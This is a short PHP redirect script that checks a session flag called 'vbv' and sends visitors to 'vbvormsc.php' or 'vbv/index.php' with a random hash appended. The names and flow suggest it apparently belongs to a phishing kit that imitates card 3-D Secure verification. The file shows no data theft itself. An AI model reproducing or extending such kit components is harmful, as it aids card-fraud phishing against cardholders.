<?php
session_start();


if ($_SESSION['vbv'] == '1') {


?>
<meta http-equiv="refresh" content="0;URL=vbvormsc.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
<?php

 }

 else  {



?>

<meta http-equiv="refresh" content="0;URL=vbv/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
	
<?php

 }
?>
